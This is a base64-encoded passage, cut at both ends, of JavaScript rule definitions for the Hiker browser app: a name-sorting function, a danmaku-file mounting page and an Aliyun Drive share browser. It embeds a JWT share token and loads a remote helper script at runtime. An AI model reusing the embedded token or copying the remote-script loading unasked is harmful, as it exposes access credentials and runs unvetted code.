ICAgICB9XFxuXFxuICAgICAgICBmdW5jdGlvbiBuYW1lQ29tcGFyZShhLCBiKSB7XFxuICAgICAgICAgICAgaWYgKGEgPT0gbnVsbCB8fCBiID09IG51bGwpXFxuICAgICAgICAgICAgICAgIHJldHVybiBhID09IG51bGwgPyBiID09IG51bGwgPyAwIDogLTEgOiAxO1xcblxcbiAgICAgICAgICAgIGEgPSBhLnJlcGxhY2UoLyhb6Zu25LiA5LqM5LiJ5Zub5LqU5YWt5LiD5YWr5Lmd5Y2B55m+5Y2D5LiH5Lq/XSkvZywgZnVuY3Rpb24obWF0Y2gsIHAxLCBwMiwgcDMsIG9mZnNldCwgc3RyaW5nKSB7XFxuICAgICAgICAgICAgICAgIC8vIHAxIGlzIG5vbmRpZ2l0cywgcDIgZGlnaXRzLCBhbmQgcDMgbm9uLWFscGhhbnVtZXJpY3NcXG4gICAgICAgICAgICAgICAgcmV0dXJuIENoaW5lc2VUb051bWJlcihwMSk7XFxuICAgICAgICAgICAgfSlcXG4gICAgICAgICAgICBiID0gYi5yZXBsYWNlKC8oW+mbtuS4gOS6jOS4ieWbm+S6lOWFreS4g+WFq+S5neWNgeeZvuWNg+S4h+S6v10pL2csIGZ1bmN0aW9uKG1hdGNoLCBwMSwgcDIsIHAzLCBvZmZzZXQsIHN0cmluZykge1xcbiAgICAgICAgICAgICAgICAvLyBwMSBpcyBub25kaWdpdHMsIHAyIGRpZ2l0cywgYW5kIHAzIG5vbi1hbHBoYW51bWVyaWNzXFxuICAgICAgICAgICAgICAgIHJldHVybiBDaGluZXNlVG9OdW1iZXIocDEpO1xcbiAgICAgICAgICAgIH0pXFxuXFxuICAgICAgICAgICAgbGV0IE5VTUJFUlMgPSBqYXZhLnV0aWwucmVnZXguUGF0dGVybi5jb21waWxlKFxcXCIoPzw9XFxcXFxcXFxEKSg/PVxcXFxcXFxcZCl8KD88PVxcXFxcXFxcZCkoPz1cXFxcXFxcXEQpXFxcIilcXG4gICAgICAgICAgICBsZXQgc3BsaXQxID0gTlVNQkVSUy5zcGxpdChuZXcgamF2YS5sYW5nLlN0cmluZyhhKSk7XFxuICAgICAgICAgICAgbGV0IHNwbGl0MiA9IE5VTUJFUlMuc3BsaXQobmV3IGphdmEubGFuZy5TdHJpbmcoYikpO1xcblxcbiAgICAgICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgTWF0aC5taW4oc3BsaXQxLmxlbmd0aCwgc3BsaXQyLmxlbmd0aCk7IGkrKykge1xcbiAgICAgICAgICAgICAgICBsZXQgYzEgPSBzcGxpdDFbaV0uY2hhckNvZGVBdCgwKTtcXG4gICAgICAgICAgICAgICAgbGV0IGMyID0gc3BsaXQyW2ldLmNoYXJDb2RlQXQoMCk7XFxuICAgICAgICAgICAgICAgIGxldCBjbXAgPSAwO1xcbiAgICAgICAgICAgICAgICBsZXQgemVyb0NoYXJDb2RlID0gJzAnLmNoYXJDb2RlQXQoMCk7XFxuICAgICAgICAgICAgICAgIGxldCBuaW5lQ2hhckNvZGUgPSAnOScuY2hhckNvZGVBdCgwKTtcXG5cXG4gICAgICAgICAgICAgICAgaWYgKGMxID49IHplcm9DaGFyQ29kZSAmJiBjMSA8PSBuaW5lQ2hhckNvZGUgJiYgYzIgPj0gemVyb0NoYXJDb2RlICYmIGMyIDw9IG5pbmVDaGFyQ29kZSkge1xcbiAgICAgICAgICAgICAgICAgICAgY21wID0gbmV3IGphdmEubWF0aC5CaWdJbnRlZ2VyKHNwbGl0MVtpXSkuY29tcGFyZVRvKG5ldyBqYXZhLm1hdGguQmlnSW50ZWdlcihzcGxpdDJbaV0pKTtcXG4gICAgICAgICAgICAgICAgfVxcblxcbiAgICAgICAgICAgICAgICBpZiAoY21wID09PSAwKSB7XFxuICAgICAgICAgICAgICAgICAgICBsZXQgcmVnZXggPSAvW2EtekEtWjAtOV0vXFxuICAgICAgICAgICAgICAgICAgICBsZXQgczEgPSBTdHJpbmcoc3BsaXQxW2ldKVxcbiAgICAgICAgICAgICAgICAgICAgbGV0IHMyID0gU3RyaW5nKHNwbGl0MltpXSlcXG4gICAgICAgICAgICAgICAgICAgIGlmIChyZWdleC50ZXN0KHMxKSB8fCByZWdleC50ZXN0KHMyKSkge1xcbiAgICAgICAgICAgICAgICAgICAgICAgIGNtcCA9IG5ldyBqYXZhLmxhbmcuU3RyaW5nKHNwbGl0MVtpXSkuY29tcGFyZVRvKG5ldyBqYXZhLmxhbmcuU3RyaW5nKHNwbGl0MltpXSkpO1xcbiAgICAgICAgICAgICAgICAgICAgICAgIC8vIGNtcCA9IHMxLmxvY2FsZUNvbXBhcmUoczIsICdlbicpXFxuICAgICAgICAgICAgICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgICAgICAgICAgICAgIGNtcCA9IHMxLmxvY2FsZUNvbXBhcmUoczIsICd6aCcpXFxuICAgICAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgIH1cXG5cXG4gICAgICAgICAgICAgICAgaWYgKGNtcCAhPT0gMCkge1xcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGNtcDtcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIH1cXG4gICAgICAgICAgICBsZXQgbGVuZ3RoQ21wID0gc3BsaXQxLmxlbmd0aCAtIHNwbGl0Mi5sZW5ndGg7XFxuICAgICAgICAgICAgLy8gaWYgKGxlbmd0aENtcCAhPT0gMCkgbGVuZ3RoQ21wID0gbGVuZ3RoQ21wID4gMCA/IC0xIDogMTtcXG4gICAgICAgICAgICByZXR1cm4gbGVuZ3RoQ21wO1xcbiAgICAgICAgfVxcbiAgICAgICAgcmV0dXJuIG5hbWVDb21wYXJlO1xcbiAgICB9XFxufVwifSx7XCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwibmFtZVwiOlwi5by55bmV5om56YeP5oyC6L29XCIsXCJwYXRoXCI6XCJkbU1vdW50XCIsXCJydWxlXCI6XCJqczpcXG5sZXQgZCA9IFtdO1xcbmQucHVzaCh7XFxuICAgIHRpdGxlOiBcXFwi5riF56m65oyC6L295YiX6KGoXFxcIixcXG4gICAgdXJsOiAkKFxcXCJub0xvYWRpbmcjXFxcIikubGF6eVJ1bGUoKCk9PntcXG4gICAgICAgIGNsZWFyTXlWYXIoXFxcImRtbGlzdFxcXCIpO1xcbiAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpO1xcbiAgICAgICAgcmV0dXJuIFxcXCJoaWtlcjovL2VtcHR5XFxcIjtcXG4gICAgfSksXFxuICAgIGNvbF90eXBlOiBcXFwidGV4dF8yXFxcIixcXG59KTtcXG5kLnB1c2goe1xcbiAgICB0aXRsZTogXFxcIuS4i+i9veW8ueW5lVxcXCIsXFxuICAgIGNvbF90eXBlOiBcXFwidGV4dF8yXFxcIixcXG4gICAgdXJsOiBcXFwiaGlrZXI6Ly9wYWdlL2xvYWREbSNub0hpc3RvcnkjI25vUmVjb3JkSGlzdG9yeSNcXFwiLFxcbiAgICBleHRyYTp7XFxuICAgICAgICBvbmx5RG93bmxvYWQgOiB0cnVlXFxuICAgIH1cXG59KTtcXG5kLnB1c2goe1xcbiAgICBjb2xfdHlwZTogXFxcImxpbmVfYmxhbmtcXFwiXFxufSk7XFxuZC5wdXNoKHtcXG4gICAgdGl0bGU6IFxcXCLigJzigJzigJ3igJ1cXFwiICsgXFxcIuW3suaMgui9vVxcXCIuYmlnKCksXFxuICAgIHVybDogJChcXFwiI25vTG9hZGluZyNcXFwiKS5sYXp5UnVsZSgoKT0+e1xcbiAgICAgICAgbGV0IGRtbGlzdCA9IHN0b3JhZ2UwLmdldE15VmFyKFxcXCJkbWxpc3RcXFwiLCBbXSk7XFxuICAgICAgICBsZXQgYWxpVXRpbD0kLnJlcXVpcmUoXFxcImFsaVV0aWxcXFwiKTtcXG4gICAgICAgIGxldCBuYW1lQ29tcGFyZT1hbGlVdGlsLmdldE5hbWVzU29ydCgpO1xcbiAgICAgICAgZG1saXN0LnNvcnQoKGEsYik9Pm5hbWVDb21wYXJlKGEsYikpO1xcbiAgICAgICAgc3RvcmFnZTAucHV0TXlWYXIoXFxcImRtbGlzdFxcXCIsIGRtbGlzdCk7XFxuICAgICAgICByZWZyZXNoUGFnZShmYWxzZSk7XFxuICAgICAgICByZXR1cm4gXFxcInRvYXN0Oi8v5o6S5bqP5a6M5oiQXFxcIjtcXG4gICAgfSksXFxuICAgIGNvbF90eXBlOiBcXFwidGV4dF9jZW50ZXJfMVxcXCJcXG59KTtcXG5sZXQgZmlsZSA9ICQucmVxdWlyZShcXFwiaHR0cHM6Ly9oaWtlcmZhbnMuY29tL3dlaXN5ci9qcy9maWxlLmpzXFxcIilcXG5sZXQgZG1saXN0ID0gc3RvcmFnZTAuZ2V0TXlWYXIoXFxcImRtbGlzdFxcXCIsIFtdKTtcXG5cXG5mb3IgKGxldCBpID0gMDsgaSA8IGRtbGlzdC5sZW5ndGg7IGkrKykge1xcbiAgICBsZXQgZG1uYW1lID0gZG1saXN0W2ldO1xcbiAgICBkLnB1c2goe1xcbiAgICAgICAgdGl0bGU6IFxcXCJbXFxcIiArIChpICsgMSkgKyBcXFwiXVxcXFx0XFxcIiArIGRtbmFtZSxcXG4gICAgICAgIHVybDogJChcXFwiI25vTG9hZGluZyNcXFwiKS5sYXp5UnVsZSgoaSkgPT4ge1xcbiAgICAgICAgICAgIGxldCBkbWxpc3QgPSBzdG9yYWdlMC5nZXRNeVZhcihcXFwiZG1saXN0XFxcIiwgW10pO1xcbiAgICAgICAgICAgIGRtbGlzdC5zcGxpY2UoaSwgMSk7XFxuICAgICAgICAgICAgc3RvcmFnZTAucHV0TXlWYXIoXFxcImRtbGlzdFxcXCIsIGRtbGlzdCk7XFxuICAgICAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpO1xcbiAgICAgICAgICAgIHJldHVybiBcXFwiaGlrZXI6Ly9lbXB0eVxcXCI7XFxuICAgICAgICB9LCBpKSxcXG4gICAgICAgIGNvbF90eXBlOiBcXFwidGV4dF8xXFxcIlxcbiAgICB9KTtcXG59XFxuZC5wdXNoKHtcXG4gICAgY29sX3R5cGU6IFxcXCJsaW5lX2JsYW5rXFxcIlxcbn0pO1xcbmQucHVzaCh7XFxuICAgIHRpdGxlOiBcXFwi4oCc4oCc4oCd4oCdXFxcIiArIFxcXCLmnKzlnLDmnKrmjILovb1cXFwiLmJpZygpLFxcbiAgICB1cmw6XFxcImhpa2VyOi8vZW1wdHlcXFwiLFxcbiAgICBjb2xfdHlwZTogXFxcInRleHRfY2VudGVyXzFcXFwiXFxufSk7XFxubGV0IGRtTGlzdFBhdGggPSBnZXRQYXRoKFxcXCJoaWtlcjovL2ZpbGVzL2NhY2hlL2Rhbm11L1xcXCIpLnNsaWNlKDcpO1xcbmxldCBmaWxlTGlzdCA9IGZpbGUuZ2V0RmlsZVBhdGgoZG1MaXN0UGF0aCwgXFxcImZpbGVcXFwiLCBcXFwiLnhtbFxcXCIpO1xcblxcbmZvciAobGV0IGkgPSAwOyBpIDwgZmlsZUxpc3QubGVuZ3RoOyBpKyspIHtcXG4gICAgbGV0IGRtZmlsZSA9IGZpbGVMaXN0W2ldO1xcbiAgICBpZiAoZG1saXN0LmluY2x1ZGVzKGRtZmlsZS5uYW1lKSkgY29udGludWU7XFxuICAgIGQucHVzaCh7XFxuICAgICAgICB0aXRsZTogZG1maWxlLm5hbWUsXFxuICAgICAgICB1cmw6ICQoXFxcIiNub0xvYWRpbmcjXFxcIikubGF6eVJ1bGUoKHBhdGgpID0+IHtcXG4gICAgICAgICAgICBsZXQgZG1saXN0ID0gc3RvcmFnZTAuZ2V0TXlWYXIoXFxcImRtbGlzdFxcXCIsIFtdKTtcXG4gICAgICAgICAgICBkbWxpc3QucHVzaChwYXRoKTtcXG4gICAgICAgICAgICBzdG9yYWdlMC5wdXRNeVZhcihcXFwiZG1saXN0XFxcIiwgZG1saXN0KTtcXG4gICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSk7XFxuICAgICAgICAgICAgcmV0dXJuIFxcXCJoaWtlcjovL2VtcHR5XFxcIjtcXG4gICAgICAgIH0sIGRtZmlsZS5uYW1lKSxcXG4gICAgICAgIGNvbF90eXBlOiBcXFwidGV4dF8xXFxcIlxcbiAgICB9KTtcXG59XFxuXFxuc2V0UmVzdWx0KGQpO1wifV0sXCJwYXJhbXNcIjpcIntcXFwiaW5oZXJpdFRpdGxlXFxcIjpmYWxzZSxcXFwic2hhcmVUb2tlblxcXCI6XFxcImV5SmhiR2NpT2lKU1V6STFOaUlzSW5SNWNDSTZJa3BYVkNKOS5leUpqZFhOMGIyMUtjMjl1SWpvaWUxd2laRzl0WVdsdVgybGtYQ0k2WENKaWFqSTVYQ0lzWENKemFHRnlaVjlwWkZ3aU9sd2lSRlZyZEZkRGNuSTFOblZjSWl4Y0ltTnlaV0YwYjNKY0lqcGNJakpoWWpnNE16VTNObVpsT1RRNVpEaGlOakEyTTJVeVpqYzRNbVJoTnpneFhDSXNYQ0oxYzJWeVgybGtYQ0k2WENKaGJtOXVlVzF2ZFhOY0luMGlMQ0pqZFhOMGIyMVVlWEJsSWpvaWMyaGhjbVZmYkdsdWF5SXNJbVY0Y0NJNk1UY3dNRGMxTkRFeU55d2lhV0YwSWpveE56QXdOelEyT0RZM2ZRLmhsZ0QtUEdsRXd4cjJsQlluNDJSZC05MjA3cndRVnRqRlV2YmdRdm5kN1hQVXlHNE9MNEl0M041T0NMNUNMQWc1NHBRQldaQmJNS2l1QkpWajZHdlkzTHVxNmpLbFpKbFFoV0ZiTklRaXJjSDF6OEFUclB5LWl5c01nMnFBTFJ6Q3hkc0VuV3FqbDZyMFZjODg4NWhqcUJBYTZOV18tOTFyRWZwRUl6U2x4QVxcXCJ9XCIsXCJzYXZlZFwiOmZhbHNlLFwidGl0bGVcIjpcIuS6keebmOWQmy7nroBcIixcInZlcnNpb25cIjowLFwidXJsXCI6XCJoaWtlcjovL3BhZ2UvYWxpeXVuP3BhZ2U9ZnlwYWdlJnJ1bGU95LqR55uY5ZCbLueugCZyZWFsdXJsPWh0dHBzJTNBJTJGJTJGd3d3LmFsaXl1bmRyaXZlLmNvbSUyRnMlMkZEVWt0V0NycjU2dSUyRmZvbGRlciUyRjY1NGExOGNjYmJmMjU1ZWU2N2I0NDkzY2JkYWQ1MWEwOWEyNmY1OGEmc2hhcmVQd2Q9XCIsXCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwiZmluZF9ydWxlXCI6XCJqczpcXG4vL0BhdXRob3IgTG95RGdJa1xcbmNvbnN0IEFsaVNoYXJlQXBpID0gJC5yZXF1aXJlKFxcXCJBbGlBcGlcXFwiKTtcXG5cXG5sZXQgcmVhbHVybCA9IGRlY29kZVVSSUNvbXBvbmVudChnZXRQYXJhbShcXFwicmVhbHVybFxcXCIsIFxcXCJcXFwiKSkuc3BsaXQoXFxcIj9cXFwiKVswXTtcXG5sZXQgdXJsRGF0YSA9IHJlYWx1cmwuc3BsaXQoXFxcIi9cXFwiKTtcXG4vL2h0dHBzOi8vd3d3LmFsaXl1bmRyaXZlLmNvbS9zL3tzaGFyZUlkfS9mb2xkZXIve2ZpbGVJZH0/O1xcblxcbmxldCBzaGFyZUlkID0gTVlfUEFSQU1TLnNoYXJlSWQgfHwgdXJsRGF0YVs0XTtcXG5sZXQgc2hhcmVQd2QgPSBnZXRQYXJhbShcXFwic2hhcmVQd2RcXFwiLCBNWV9QQVJBTVMuc2hhcmVQd2QgfHwgXFxcIlxcXCIpO1xcbmxldCBzaGFyZVRva2VuID0gZ2V0UGFyYW0oXFxcInNoYXJlVG9rZW5cXFwiLCBNWV9QQVJBTVMuc2hhcmVUb2tlbik7XFxuXFxubGV0IGZpbGVJZCA9ICh1cmxEYXRhWzVdID09PSBcXFwiZm9sZGVyXFxcIiA/IHVybERhdGFbNl0gOiB2b2lkIDApIHx8IE1ZX1BBUkFNUy5maWxlSWQ7XFxubGV0IHNlYXJjaEtleSA9IGRlY29kZVVSSUNvbXBvbmVudChnZXRQYXJhbShcXFwic2VhcmNoS2V5XFxcIiwgXFxcIlxcXCIpKSB8fCB1bmRlZmluZWQ7XFxubGV0IGlzU2VhcmNoID0gISFzZWFyY2hLZXk7XFxuXFxuZnVuY3Rpb24gZm9ybWF0RGF0ZShfZGF0ZSwgZm10KSB7XFxuICAgIGxldCBkYXRlID0gIWlzTmFOKF9kYXRlKSA/IG5ldyBEYXRlKF9kYXRlICogMTAwMCkgOiBuZXcgRGF0ZShfZGF0ZSk7XFxuICAgIHJldHVybiAkLmRhdGVGb3JtYXQoZGF0ZSwgZm10IHx8IFxcXCJ5eXl5LU1NLWRkIEhIOm1tOnNzXFxcIilcXG59XFxuc2V0UGFnZVBpY1VybCgpO1xcblxcbmZ1bmN0aW9uIGZvcm1hdFNpemUoc2l6ZSkge1xcbiAgICBpZiAoIXNpemUpIHtcXG4gICAgICAgIHJldHVybiAnJztcXG4gICAgfVxcbiAgICBjb25zdCB1bml0cyA9IFsnQicsICdLQicsICdNQicsICdHQicsICdUQicsICdQQicsICdFQicsICdaQicsICdZQiddO1xcbiAgICBsZXQgaSA9IDA7XFxuICAgIHdoaWxlIChzaXplID49IDEwMjQpIHtcXG4gICAgICAgIHNpemUgLz0gMTAyNDtcXG4gICAgICAgIGkrKztcXG4gICAgfVxcbiAgICBzaXplID0gaSA/IE51bWJlcihzaXplLnRvRml4ZWQoMikpIDogc2l6ZTtcXG4gICAgcmV0dXJuIGAke3NpemV9ICR7dW5pdHNbaV19YDtcXG59XFxuXFxuZnVuY3Rpb24gc2V0TXlQYUNhY2hlKGtleSwgdmFsdWUpIHtcXG4gICAgTVlfUEFSQU1TW2tleV0gPSB2YWx1ZTtcXG59XFxuXFxuZnVuY3Rpb24gc2F2ZU15UGFDYWNoZSgpIHtcXG4gICAgc2V0UGFnZVBhcmFtcyhNWV9QQVJBTVMpO1xcbn1cXG5cXG5mdW5jdGlvbiBzZXRNYXJrZXIobWFya2VyKSB7XFxuICAgIHNldE15UGFDYWNoZShcXFwibWFya2VyXFxcIiwgbWFya2VyKTtcXG59XFxuXFxuZnVuY3Rpb24gc2V0VG9rZW4oc2hhcmVUb2tlbikge1xcbiAgICBzZXRNeVBhQ2FjaGUoXFxcInNoYXJlVG9rZW5cXFwiLCBzaGFyZVRva2VuKTtcXG59XFxuLypcXG5mdW5jdGlvbiBzZXRWaWRlb0l0ZW1DYWNoZSh2aWRlb0l0ZW1DYWNoZSkge1xcbiAgICBzZXRNeVBhQ2FjaGUoXFxcInZpZGVvSXRlbUNhY2hlXFxcIiwgdmlkZW9JdGVtQ2FjaGUpO1xcbn1cXG5cXG5mdW5jdGlvbiBzZXRTdWJ0aXRsZUNhY2hlKHN1YnRpdGxlQ2FjaGUpIHtcXG4gICAgc2V0TXlQYUNhY2hlKFxcXCJzdWJ0aXRsZUNhY2hlXFxcIiwgc3VidGl0bGVDYWNoZSk7XFxufSovXFxuXFxubGV0IGljb25UeXBlID0gXFxcImFpfGFwa3xhdml8Y3NzfGRtZ3xleGV8Zmx2fGdpZnxoaWtlcnxodG1sfGlzb3xqcGd8anN8anNvbnxsb2d8bW92fG1wM3xtcDR8b3RmfHBocHxwbmd8cHB0fHBzZHx0YWJsZXx0eHR8d2F2fHhsc3x6aXB8Y3NzfGRvY3xlcHVifGV4Y3xodG18eGxzeFxcXCIuc3BsaXQoJ3wnKTtcXG5cXG5mdW5jdGlvbiBnZXRJY29uKGV4dCwgdHlwZSkge1xcbiAgICBsZXQgcm9vdCA9IFxcXCJodHRwczovL2dpdGNvZGUubmV0L3FxXzMyMzk0MzUxL2RyLy0vcmF3L21hc3Rlci9pbWcv5paH5Lu257G75Z6LMi9cXFwiO1xcbiAgICBpZiAodHlwZSA9PT0gXFxcImZvbGRlclxcXCIpIHtcXG4gICAgICAgIHJldHVybiByb290ICsgXFxcIuaWh+S7tuWkuS5zdmdcXFwiO1xcbiAgICB9XFxuICAgIGlmIChpY29uVHlwZS5pbmNsdWRlcygoZXh0IHx8IFxcXCJcXFwiKS50b0xvd2VyQ2FzZSgpKSkge1xcbiAgICAgICAgcmV0dXJuIHJvb3QgKyBleHQgKyBcXFwiLnN2Z1xcXCI7XFxuICAgIH1cXG4gICAgcmV0dXJuIHJvb3QgKyBcXFwi5paH5Lu2LnN2Z1xcXCI7XFxuXFxufVxcblxcbmZ1bmN0aW9uIGxvYWQoaXRlbXMpIHtcXG4gICAgbGV0IGFsaVNoYXJlQXBpID0gbmV3IEFsaVNoYXJlQXBpKHNoYXJlSWQsIHNoYXJlUHdkLCBzaGFyZVRva2VuLCAoc2hhcmVUb2tlbikgPT4ge1xcbiAgICAgICAgc2V0VG9rZW4oc2hhcmVUb2tlbik7XFxuICAgICAgICBNWV9QQVJBTVMuc2hhcmVUb2tlbiA9IHNoYXJlVG9rZW47XFxuICAgIH0pO1xcbiAgICBsZXQgb3JkZXJzID0ge1xcbiAgICAgICAgXFxcIuWQjeensOato+W6j1xcXCI6IFxcXCJuYW1lI0FTQ1xcXCIsXFxuICAgICAgICBcXFwi5ZCN56ew5YCS5bqPXFxcIjogXFxcIm5hbWUjREVTQ1xcXCIsXFxuICAgICAgICBcXFwi5pe26Ze05q2j5bqPXFxcIjogXFxcInVwZGF0ZWRfYXQjQVNDXFxcIixcXG4gICAgICAgIFxcXCLml7bpl7TlgJLluo9cXFwiOiBcXFwidXBkYXRlZF9hdCNERVNDXFxcIixcXG4gICAgICAgIFxcXCLlpKflsI/mraPluo9cXFwiOiBcXFwic2l6ZSNBU0NcXFwiLFxcbiAgICAgICAgXFxcIuWkp+Wwj+WAkuW6j1xcXCI6IFxcXCJzaXplI0RFU0NcXFwiXFxuICAgIH07XFxuICAgIGxldCBvcmRlcnNLZXlzID0gT2JqZWN0LmtleXMob3JkZXJzKTtcXG4gICAgbGV0IG9yZGVyTmFtZSA9IGdldEl0ZW0oXFxcImFsaXl1bl9vcmRlclxcXCIsIG9yZGVyc0tleXNbMF0pO1xcbiAgICBsZXQgb3JkZXIgPSBvcmRlcnNbb3JkZXJOYW1lXS5zcGxpdChcXFwiI1xcXCIpO1xcbiAgICBsZXQgc3R5bGVzID0gW1xcXCJ0ZXh0XzFcXFwiLCBcXFwibW92aWVfMlxcXCIsIFxcXCJjYXJkX3BpY18zXFxcIiwgXFxcImF2YXRhclxcXCIvKiwgXFxcIui/veWJp1xcXCIqL107XFxuICAgIGxldCBzdHlsZSA9IGdldEl0ZW0oXFxcImFsaXl1bl9zdHlsZVxcXCIsIHN0eWxlc1swXSk7XFxuICAgIGlmIChNWV9QQUdFID09PSAxKSB7XFxuICAgICAgICBpZiAoIWdldE15VmFyKFxcXCJtb3VudHppbXVcXFwiLCBcXFwiXFxcIikpIHtcXG4gICAgICAgICAgICBzdG9yYWdlMC5wdXRNeVZhcihcXFwibW91bnR6aW11XFxcIiwge30pO1xcbiAgICAgICAgICAgIGFkZExpc3RlbmVyKFxcXCJvbkNsb3NlXFxcIiwgJC50b1N0cmluZygoKSA9PiB7XFxuICAgICAgICAgICAgICAgIGNsZWFyTXlWYXIoXFxcIm1vdW50emltdVxcXCIpO1xcbiAgICAgICAgICAgICAgICBjbGVhck15VmFyKFxcXCJhbGlTaGFyZVRva2VuXFxcIik7XFxuICAgICAgICAgICAgICAgIGNsZWFyVmFyKFxcXCJkbV9zaGFyZVxcXCIpO1xcbiAgICAgICAgICAgICAgICBjbGVhck15VmFyKFxcXCJkbWxpc3RcXFwiKTtcXG4gICAgICAgICAgICB9KSk7XFxuICAgICAgICB9XFxuICAgICAgICBzZXRNYXJrZXIoKTtcXG4gICAgICAgIGlmIChyZWFsdXJsICYmICFpc1NlYXJjaCkge1xcbiAgICAgICAgICAgIGxldCBzaGFyZUluZm8gPSBhbGlTaGFyZUFwaS5nZXRTaGFyZUluZm8oKTtcXG5cXG4gICAgICAgICAgICBsZXQgZmlsZUluZm8gPSBzaGFyZUluZm8uZmlsZV9pbmZvcztcXG4gICAgICAgICAgICBpZiAoZmlsZUluZm8ubGVuZ3RoID09PSAxICYmIGZpbGVJbmZvWzBdLnR5cGUgPT09IFxcXCJmb2xkZXJcXFwiICYmICFmaWxlSWQpIHtcXG4gICAgICAgICAgICAgICAgZmlsZUlkID0gZmlsZUluZm9bMF0uZmlsZV9pZDtcXG4gICAgICAgICAgICAgICAgc2V0UGFnZVRpdGxlKGZpbGVJbmZvWzBdLmZpbGVfbmFtZSk7XFxuICAgICAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICAgICAgc2V0UGFnZVRpdGxlKHNoYXJlSW5mby5zaGFyZV9uYW1lKTtcXG4gICAgICAgICAgICB9XFxuICAgICAgICAgICAgbGV0IGRlYWRsaW5lID0gXFxcIuawuOS5heacieaViFxcXCI7XFxuXFxuICAgICAgICAgICAgaWYgKHNoYXJlSW5mby5leHBpcmF0aW9uKSB7XFxuICAgICAgICAgICAgICAgIGRlYWRsaW5lID0gXFxcIuacieaViOiHs++8mlxcXCIgKyBmb3JtYXREYXRlKHNoYXJlSW5mby5leHBpcmF0aW9uKTtcXG4gICAgICAgICAgICAgICAgLy9zaGFyZUluZm8udXBkYXRlZF9hdFxcbiAgICAgICAgICAgIH1cXG4gICAgICAgICAgICBpdGVtcy5wdXNoKHtcXG4gICAgICAgICAgICAgICAgdGl0bGU6IChzaGFyZUluZm8uY3JlYXRvcl9uYW1lIHx8IHNoYXJlSW5mby5jcmVhdG9yX3Bob25lKSArIFxcXCImbmJzcDsmbmJzcDtcXFwiICsgZGVhZGxpbmUuc21hbGwoKSxcXG4gICAgICAgICAgICAgICAgdXJsOiByZWFsdXJsICsgXFxcIiNub0hpc3RvcnkjXFxcIixcXG4gICAgICAgICAgICAgICAgaW1nOiBzaGFyZUluZm8uYXZhdGFyLFxcbiAgICAgICAgICAgICAgICBjb2xfdHlwZTogXFxcImF2YXRhclxcXCJcXG4gICAgICAgICAgICB9KTtcXG4gICAgICAgIH1cXG4gICAgICAgIGlmICghaXNTZWFyY2gpIHtcXG4gICAgICAgICAgICBpdGVtcy5wdXNoKHtcXG4gICAgICAgICAgICAgICAgdGl0bGU6IFxcXCLmkJzntKJcXFwiLFxcbiAgICAgICAgICAgICAgICB1cmw6ICQudG9TdHJpbmcoKCkgPT4ge1xcbiAgICAgICAgICAgICAgICAgICAgaW5wdXQgPSBpbnB1dC50cmltKCk7XFxuICAgICAgICAgICAgICAgICAgICBpZiAoIWlucHV0KSByZXR1cm4gXFxcInRvYXN0Oi8v6K+36L6T5YWl5YWz6ZSu6K+NXFxcIjtcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFwiaGlrZXI6Ly9wYWdlL2FsaXl1biNub0hpc3RvcnkjI2Z1bGxUaGVtZSM/cGFnZT1meXBhZ2Umc2VhcmNoS2V5PVxcXCIgKyBlbmNvZGVVUklDb21wb25lbnQoaW5wdXQpO1xcbiAgICAgICAgICAgICAgICB9KSxcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJpbnB1dFxcXCIsXFxuICAgICAgICAgICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgICAgICAgICAgICBzaGFyZVB3ZDogc2hhcmVQd2QsXFxuICAgICAgICAgICAgICAgICAgICBzaGFyZUlkOiBzaGFyZUlkLFxcbiAgICAgICAgICAgICAgICAgICAgc2hhcmVUb2tlbjogc2hhcmVUb2tlblxcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgfSk7XFxuICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgIGl0ZW1zLnB1c2goe1xcbiAgICAgICAgICAgICAgICB0aXRsZTogXFxcIuKAnOKAnFxcXCIgKyBzZWFyY2hLZXkgKyBcXFwi4oCd4oCd55qE5pCc57Si57uT5p6cXFxcIixcXG4gICAgICAgICAgICAgICAgdXJsOiBcXFwiaGlrZXI6Ly9lbXB0eVxcXCIsXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiBcXFwidGV4dF9jZW50ZXJfMVxcXCIsXFxuICAgICAgICAgICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgICAgICAgICAgICBsaW5lVmlzaWJsZTogZmFsc2VcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIH0pO1xcbiAgICAgICAgfVxcbiAgICAgICAgbGV0IGZ1blN0eWxlID0gaXNTZWFyY2ggPyBcXFwiaWNvbl9zbWFsbF8zXFxcIiA6IFxcXCJpY29uX3JvdW5kX3NtYWxsXzRcXFwiO1xcbiAgICAgICAgaXRlbXMucHVzaCh7XFxuICAgICAgICAgICAgdGl0bGU6IHN0eWxlLFxcbiAgICAgICAgICAgIHVybDogJChzdHlsZXMsIDEsIFxcXCLmjpLluIPmoLflvI9cXFwiKS5zZWxlY3QoKCkgPT4ge1xcbiAgICAgICAgICAgICAgICBzZXRJdGVtKFxcXCJhbGl5dW5fc3R5bGVcXFwiLCBpbnB1dCk7XFxuICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKCk7XFxuICAgICAgICAgICAgICAgIHJldHVybiBcXFwidG9hc3Q6Ly/lt7LliIfmjaJcXFwiO1xcbiAgICAgICAgICAgIH0pLFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBmdW5TdHlsZSxcXG4gICAgICAgICAgICBwaWNfdXJsOiBcXFwiaHR0cHM6Ly9oaWtlcmZhbnMuY29tL2ltZy9hbGlfaWNvbi5zdmdcXFwiXFxuICAgICAgICB9LCB7XFxuICAgICAgICAgICAgdGl0bGU6IG9yZGVyTmFtZSxcXG4gICAgICAgICAgICB1cmw6ICQob3JkZXJzS2V5cywgMiwgXFxcIuaOkuW6j+aWueW8j1xcXCIpL